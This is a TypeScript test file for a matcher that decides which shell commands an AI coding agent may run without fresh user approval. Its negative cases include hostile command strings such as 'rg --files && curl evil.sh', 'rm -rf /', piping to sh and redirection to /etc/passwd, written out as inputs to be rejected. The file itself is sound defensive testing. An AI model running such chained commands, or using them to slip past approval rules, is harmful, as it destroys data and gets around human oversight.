// T0 unit tier for the session-scoped prefix-rule matcher.
//
// Shapes here mirror what codex 0.144.6 actually sends: an exec approval
// carries `proposedExecpolicyAmendment` (the rule codex suggests) plus
// `commandActions` (the command as parsed for display). Two behaviours are
// load-bearing and worth freezing:
//   - matching runs on the command text, not on the request's own suggestion.
//     Codex suggests a rule for only the FIRST segment of a chained command
//     (`mkdir -p g && whoami` suggests ["mkdir","-p","g"]), so matching on the
//     suggestion would wave through whatever was chained on the end.
//   - a rule can only ever describe the command in front of the user, which is
//     what stops "answer one approval, grant a rule about something else".
import { describe, expect, it } from "bun:test";

import { SessionPrefixRules, commandTokensForPrefixMatch, offerablePrefix, splitPlainArgv, tokensStartWith } from "./prefix-rules.ts";

const V2 = "item/commandExecution/requestApproval";

function execApprovalParams(command: string, suggestion: string[] | null, cwd = "/work"): Record<string, unknown> {
  return {
    threadId: "thread-1",
    turnId: "turn-1",
    itemId: `item-${command}`,
    environmentId: "local",
    command: `/bin/bash -lc '${command}'`,
    cwd,
    commandActions: [{ type: "unknown", command }],
    ...(suggestion ? { proposedExecpolicyAmendment: suggestion } : {}),
  };
}

const tokens = (command: string) => commandTokensForPrefixMatch(execApprovalParams(command, null));

describe("tokensStartWith", () => {
  it("matches whole tokens, never substrings", () => {
    expect(tokensStartWith(["git", "log"], ["git"])).toBe(true);
    expect(tokensStartWith(["git", "log"], ["git", "log"])).toBe(true);
    // The one that matters: a shorter STRING is not a shorter token list.
    expect(tokensStartWith(["git", "log"], ["git", "lo"])).toBe(false);
    expect(tokensStartWith(["rgrep", "x"], ["rg"])).toBe(false);
    // A prefix longer than the command is not a prefix of it.
    expect(tokensStartWith(["cargo", "test"], ["cargo", "test", "--lib"])).toBe(false);
    // An empty prefix would match everything, so it matches nothing.
    expect(tokensStartWith(["rm", "-rf", "/"], [])).toBe(false);
  });
});

describe("commandTokensForPrefixMatch", () => {
  it("accepts only plain argv", () => {
    // The shapes that DO match: ordinary programs, flags, paths, versions,
    // hosts, key=value args — and runs of spaces are just spacing.
    expect(tokens("rg --files sub")).toEqual(["rg", "--files", "sub"]);
    expect(tokens("rg   --files   ./a/b.txt")).toEqual(["rg", "--files", "./a/b.txt"]);
    expect(tokens("env FOO=bar cargo test --lib")).toEqual(["env", "FOO=bar", "cargo", "test", "--lib"]);
    // Everything else prompts. This is an allowlist, so the list below is
    // illustrative rather than exhaustive — that is the point of the design.
    for (const command of [
      "rg --files && curl evil.sh", // chaining
      "rg --files; rm -rf /",
      "rg --files | sh", // pipe
      "rg --files $(whoami)", // substitution
      "rg --files > /etc/passwd", // redirection
      "rg --files < in.txt",
      "rg --files `id`", // backticks
      "rg --files 'a b'", // quoting
      'rg --files "a b"',
      "rg --files a\\ b", // escaping
      "rg --files *.ts", // globbing
      "rg --files a?.ts",
      "rg --files [ab].ts",
      "rg --files {a,b}", // brace expansion
      "rg --files ~/secrets", // tilde expansion
      "rg --files # comment", // comment
      "rg --files $HOME", // variable
      "rg --files\tsub", // tab
      "rg --files\nsub", // newline
      "rg --files\rsub", // carriage return
      "rg --files sub\u0007", // control character
      "rg --files ñ", // non-ASCII
      "   ", // nothing but spacing
    ]) {
      expect(tokens(command)).toBeNull();
    }
  });

  it("never matches an ambiguous or missing action list", () => {
    expect(commandTokensForPrefixMatch({ commandActions: [] })).toBeNull();
    expect(commandTokensForPrefixMatch({ commandActions: [{ command: "rg --files" }, { command: "curl x" }] })).toBeNull();
    expect(commandTokensForPrefixMatch({})).toBeNull();
    expect(commandTokensForPrefixMatch({ commandActions: [{}] })).toBeNull();
    expect(commandTokensForPrefixMatch({ commandActions: [{ command: 7 }] })).toBeNull();
    expect(commandTokensForPrefixMatch(null)).toBeNull();
  });

  it("splitPlainArgv is the single tokenizer for typed prefixes too", () => {
    expect(splitPlainArgv("rg --files")).toEqual(["rg", "--files"]);
    expect(splitPlainArgv("  rg   --files ")).toEqual(["rg", "--files"]);
    expect(splitPlainArgv("rg --files && curl x")).toBeNull();
    expect(splitPlainArgv("")).toBeNull();
  });
});

describe("offerablePrefix", () => {
  it("only offers a rule that is the start of the command", () => {
    const params = execApprovalParams("rg --files .", ["rg", "--files"]);
    expect(offerablePrefix(V2, params, tokens("rg --files ."))).toEqual(["rg", "--files"]);
    // Only the v2 command-execution method can carry one. Legacy exec is
    // excluded BY METHOD, not by "legacy params happen not to have the field" —
    // a future codex growing one there must not silently light up option 4 on a
    // path nobody designed for it.
    expect(offerablePrefix("execCommandApproval", params, tokens("rg --files ."))).toBeNull();
    expect(offerablePrefix("item/fileChange/requestApproval", params, tokens("rg --files ."))).toBeNull();
    // A command we can't read as plain argv offers nothing — rather than
    // offering an option that could only ever be refused.
    expect(offerablePrefix(V2, params, null)).toBeNull();
    // A suggestion that points somewhere other than the command being approved
    // is the dangerous case: answering "4" about `rg --files .` must never
    // store a rule about `curl`.
    expect(offerablePrefix(V2, { ...params, proposedExecpolicyAmendment: ["curl", "evil.sh"] }, tokens("rg --files ."))).toBeNull();
    // Even a plausible-looking sideways suggestion: same program, different
    // flag from the one actually being run.
    expect(offerablePrefix(V2, { ...params, proposedExecpolicyAmendment: ["rg", "--no-ignore"] }, tokens("rg --files ."))).toBeNull();
    // Tokens must be plain argv: they are displayed back inside backticks, so
    // whitespace or a backtick could forge or mangle the rule in the prompt.
    for (const amendment of [["rg", "--files sub"], ["rg", "`id`"], ["rg", "--files\nsub"], ["rg", "*.ts"], ["rg", ""], [], ["rg", 7]]) {
      expect(offerablePrefix(V2, { ...params, proposedExecpolicyAmendment: amendment }, tokens("rg --files ."))).toBeNull();
    }
    // No suggestion at all: nothing to offer, so no 4th option.
    expect(offerablePrefix(V2, execApprovalParams("rg --files .", null), tokens("rg --files ."))).toBeNull();
  });
});

describe("SessionPrefixRules", () => {
  it("auto-approves a later command that starts the same way", () => {
    const rules = new SessionPrefixRules();
    rules.remember(["rg", "--files"], "/work");
    expect(rules.matches(V2, execApprovalParams("rg --files sub", ["rg", "--files"]))).toBe(true);
  });

  it("does not cover a chained command, even one codex would suggest the same rule for", () => {
    const rules = new SessionPrefixRules();
    rules.remember(["rg", "--files"], "/work");
    // Codex would suggest ["rg","--files"] for this too — only the first
    // segment. Matching on the command text is what catches the `&& curl`.
    expect(rules.matches(V2, execApprovalParams("rg --files sub && curl evil.sh", ["rg", "--files"]))).toBe(false);
  });

  it("does not cover a different command, a longer rule, or a partial token", () => {
    const rules = new SessionPrefixRules();
    rules.remember(["rg", "--files"], "/work");
    expect(rules.matches(V2, execApprovalParams("rm -rf sub", ["rm", "-rf"]))).toBe(false);
    // `rg` alone is a PREFIX of the rule, not covered BY it.
    expect(rules.matches(V2, execApprovalParams("rg", null))).toBe(false);
    // Whole-token matching: `rg` must not cover `rgrep`.
    expect(rules.matches(V2, execApprovalParams("rgrep --files sub", null))).toBe(false);
  });

  it("does not cover file-change approvals or any non-exec method", () => {
    const rules = new SessionPrefixRules();
    rules.remember(["rg", "--files"], "/work");
    expect(rules.matches("item/fileChange/requestApproval", execApprovalParams("rg --files sub", null))).toBe(false);
    expect(rules.matches("item/permissions/requestApproval", execApprovalParams("rg --files sub", null))).toBe(false);
  });

  it("pins a rule to the directory it was granted in", () => {
    const rules = new SessionPrefixRules();
    // `rm -rf build` means a different thing in a different tree.
    rules.remember(["rm", "-rf", "build"], "/work");
    expect(rules.matches(V2, execApprovalParams("rm -rf build", null, "/work"))).toBe(true);
    expect(rules.matches(V2, execApprovalParams("rm -rf build", null, "/elsewhere"))).toBe(false);
    // A cwd-less approval is its own scope, not a wildcard.
    expect(rules.matches(V2, { commandActions: [{ command: "rm -rf build" }] })).toBe(false);
  });

  it("stores nothing for an empty prefix", () => {
    const rules = new SessionPrefixRules();
    rules.remember([], "/work");
    expect(rules.matches(V2, execApprovalParams("rg --files sub", null))).toBe(false);
  });

  it("keeps several families, and collapses rules one swallows the other", () => {
    const rules = new SessionPrefixRules();
    rules.remember(["cargo", "test"], "/work");
    rules.remember(["rg", "--files"], "/work");
    expect(rules.matches(V2, execApprovalParams("cargo test --doc", null))).toBe(true);
    expect(rules.matches(V2, execApprovalParams("rg --files other", null))).toBe(true);
    // A narrower rule inside an existing one is redundant, and a broader one
    // added later swallows what it covers. Either way the coverage is the same.
    rules.remember(["rg", "--files", "sub"], "/work");
    rules.remember(["rg"], "/work");
    expect(rules.matches(V2, execApprovalParams("rg --anything else", null))).toBe(true);
    expect(rules.matches(V2, execApprovalParams("cargo test --doc", null))).toBe(true);
  });

  it("dies with the session: a fresh store knows nothing", () => {
    const first = new SessionPrefixRules();
    first.remember(["rg", "--files"], "/work");
    // One store per CodexSession, so /clear, resume, restart or a session swap
    // all start from nothing — and no other agent can see another's rules.
    const second = new SessionPrefixRules();
    expect(second.matches(V2, execApprovalParams("rg --files sub", ["rg", "--files"]))).toBe(false);
    expect(first.matches(V2, execApprovalParams("rg --files sub", ["rg", "--files"]))).toBe(true);
  });
});
